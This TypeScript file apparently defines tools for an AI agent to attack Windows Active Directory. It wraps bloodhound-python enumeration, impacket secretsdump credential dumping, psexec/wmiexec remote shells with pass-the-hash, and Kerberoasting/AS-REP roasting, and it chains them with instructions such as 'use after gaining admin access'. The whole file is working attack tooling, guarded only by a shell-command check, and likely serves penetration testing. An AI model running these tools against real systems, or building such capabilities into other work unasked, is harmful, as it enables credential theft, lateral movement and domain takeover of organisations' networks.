import { tool } from "ai";
import { z } from "zod";
import { native } from "../lib/native";
import { checkShellCommand } from "../lib/security";
import type { ToolContext } from "./context";

const shEscape = (s: string) => `'${s.replace(/'/g, "'\\''")}'`;

const sessionShells = new Map<string, Promise<number>>();

async function getSessionShell(sessionId: string, cwd: string | null): Promise<number> {
  let p = sessionShells.get(sessionId);
  if (!p) {
    p = native.shellSessionOpen(cwd);
    sessionShells.set(sessionId, p);
  }
  return p;
}

export function buildADTools(ctx: ToolContext) {
  return {
    ad_bloodhound: tool({
      description:
        "Run bloodhound-python to collect AD data (users, groups, GPOs, ACLs, sessions, trusts). Outputs JSON files for BloodHound. Run after obtaining valid domain credentials. Data saved to /tmp/mr-robot/bloodhound/.",
      inputSchema: z.object({
        domain: z.string().describe("e.g. corp.local"),
        dc_ip: z.string().describe("Domain controller IP"),
        user: z.string(),
        password: z.string().optional(),
        hash: z.string().optional().describe("NTLM hash for pass-the-hash"),
        collection: z.array(z.enum(["All", "DCOnly", "Session", "LoggedOn", "Trusts", "Default"])).optional(),
      }),
      execute: async ({ domain, dc_ip, user, password, hash, collection }) => {
        const outDir = "/tmp/mr-robot/bloodhound";
        const sid = ctx.getSessionId();
        if (!sid) return { error: "no active chat session" };
        const shellId = await getSessionShell(sid, ctx.getCwd());
        const mkdirCmd = `mkdir -p ${shEscape(outDir)}`;
        try {
          await native.shellSessionRun(shellId, mkdirCmd, null, 5);
        } catch { /* ignore */ }
        const collections = collection?.join(",") ?? "All";
        let cmd: string;
        if (hash) {
          cmd = `bloodhound-python -d ${shEscape(domain)} -u ${shEscape(user)} --hashes ${shEscape(hash)} -ns ${shEscape(dc_ip)} -c ${shEscape(collections)} --zip -o ${shEscape(outDir)} 2>&1`;
        } else {
          cmd = `bloodhound-python -d ${shEscape(domain)} -u ${shEscape(user)} -p ${shEscape(password ?? "")} -ns ${shEscape(dc_ip)} -c ${shEscape(collections)} --zip -o ${shEscape(outDir)} 2>&1`;
        }
        const safety = checkShellCommand(cmd);
        if (!safety.ok) return { error: safety.reason };
        try {
          const handle = await native.shellBgSpawn(cmd, ctx.getCwd());
          return { handle, domain, dc_ip, output_dir: outDir, ok: true };
        } catch (e) {
          return { error: String(e) };
        }
      },
    }),

    impacket_secretsdump: tool({
      description:
        "Dump SAM, LSA secrets, NTDS.dit hashes from a Windows target using impacket secretsdump. Use after gaining admin access. Saves output to /tmp/mr-robot/secretsdump.txt.",
      inputSchema: z.object({
        target: z.string(),
        user: z.string(),
        password: z.string().optional(),
        hash: z.string().optional().describe("NTLM hash for pass-the-hash: LM:NT format"),
        domain: z.string().optional(),
      }),
      execute: async ({ target, user, password, hash, domain }) => {
        const sid = ctx.getSessionId();
        if (!sid) return { error: "no active chat session" };
        const shellId = await getSessionShell(sid, ctx.getCwd());
        const outFile = "/tmp/mr-robot/secretsdump.txt";
        const dom = domain || ".";
        let cmd: string;
        if (hash) {
          cmd = `impacket-secretsdump -hashes ${shEscape(hash)} ${shEscape(`${dom}/${user}`)}@${shEscape(target)} 2>&1 | tee ${shEscape(outFile)}`;
        } else {
          cmd = `impacket-secretsdump ${shEscape(`${dom}/${user}:${password ?? ""}`)}@${shEscape(target)} 2>&1 | tee ${shEscape(outFile)}`;
        }
        const safety = checkShellCommand(cmd);
        if (!safety.ok) return { error: safety.reason };
        try {
          const r = await native.shellSessionRun(shellId, cmd, null, 120);
          return { stdout: r.stdout, stderr: r.stderr, output_file: outFile, exit_code: r.exit_code };
        } catch (e) {
          return { error: String(e) };
        }
      },
    }),

    impacket_exec: tool({
      description:
        "Remote execution on Windows targets via impacket (psexec, wmiexec, smbexec, atexec). Use to get a shell or run commands after obtaining credentials or hashes.",
      inputSchema: z.object({
        method: z.enum(["psexec", "wmiexec", "smbexec", "atexec"]),
        target: z.string(),
        user: z.string(),
        password: z.string().optional(),
        hash: z.string().optional(),
        domain: z.string().optional(),
        command: z.string().optional().describe("Single command to run. Omit for interactive shell via bash_background."),
      }),
      execute: async ({ method, target, user, password, hash, domain, command }) => {
        const dom = domain || ".";
        let cmd: string;
        if (hash) {
          cmd = `impacket-${method} -hashes ${shEscape(hash)} ${shEscape(`${dom}/${user}`)}@${shEscape(target)}`;
        } else {
          cmd = `impacket-${method} ${shEscape(`${dom}/${user}:${password ?? ""}`)}@${shEscape(target)}`;
        }
        if (command) {
          cmd += ` ${shEscape(command)}`;
        }
        const safety = checkShellCommand(cmd);
        if (!safety.ok) return { error: safety.reason };
        try {
          if (command) {
            const sid = ctx.getSessionId();
            if (!sid) return { error: "no active chat session" };
            const shellId = await getSessionShell(sid, ctx.getCwd());
            const r = await native.shellSessionRun(shellId, cmd, null, 60);
            return { stdout: r.stdout, stderr: r.stderr, exit_code: r.exit_code };
          } else {
            const handle = await native.shellBgSpawn(cmd, ctx.getCwd());
            return { handle, method, target, ok: true, note: "background shell spawned. Use bash_logs to interact." };
          }
        } catch (e) {
          return { error: String(e) };
        }
      },
    }),

    kerberoast: tool({
      description:
        "Perform Kerberoasting (request TGS tickets for SPNs) or AS-REP Roasting (users without pre-auth). Returns hashes ready for crack_hash. Always run hacktricks_search 'kerberoasting' first.",
      inputSchema: z.object({
        attack: z.enum(["kerberoast", "asreproast"]),
        dc_ip: z.string(),
        domain: z.string(),
        user: z.string().optional().describe("For kerberoast: authenticated user"),
        users: z.array(z.string()).optional().describe("For asreproast: list of usernames to test"),
        password: z.string().optional(),
        hash: z.string().optional(),
      }),
      execute: async ({ attack, dc_ip, domain, user, users, password, hash }) => {
        const sid = ctx.getSessionId();
        if (!sid) return { error: "no active chat session" };
        const shellId = await getSessionShell(sid, ctx.getCwd());
        const outFile = `/tmp/mr-robot/${attack}_hashes.txt`;
        let cmd: string;
        if (attack === "kerberoast") {
          const userPart = user ? `${domain}/${user}` : domain;
          if (hash) {
            cmd = `impacket-GetUserSPNs -request -dc-ip ${shEscape(dc_ip)} ${shEscape(userPart)} -hashes ${shEscape(hash)} -outputfile ${shEscape(outFile)} 2>&1`;
          } else {
            cmd = `impacket-GetUserSPNs -request -dc-ip ${shEscape(dc_ip)} ${shEscape(`${userPart}:${password ?? ""}`)} -outputfile ${shEscape(outFile)} 2>&1`;
          }
        } else {
          const usersFile = "/tmp/mr-robot/users.txt";
          if (users && users.length > 0) {
            try {
              await native.writeFile(usersFile, users.join("\n") + "\n");
            } catch (e) {
              return { error: "failed to write users file: " + String(e) };
            }
            cmd = `impacket-GetNPUsers -dc-ip ${shEscape(dc_ip)} ${shEscape(`${domain}/`)} -no-pass -usersfile ${shEscape(usersFile)} -outputfile ${shEscape(outFile)} 2>&1`;
          } else {
            return { error: "asreproast requires a list of usernames via the 'users' parameter" };
          }
        }
        const safety = checkShellCommand(cmd);
        if (!safety.ok) return { error: safety.reason };
        try {
          const r = await native.shellSessionRun(shellId, cmd, null, 120);
          const stdout = r.stdout;
          const hashes = stdout.split("\n").filter((l) => l.includes("$krb5") || l.includes("Hash")).join("\n");
          return {
            attack,
            domain,
            dc_ip,
            stdout: stdout.slice(0, 8000),
            hashes_found: hashes.length > 0 ? hashes : null,
            output_file: outFile,
            exit_code: r.exit_code,
          };
        } catch (e) {
          return { error: String(e) };
        }
      },
    }),
  } as const;
}
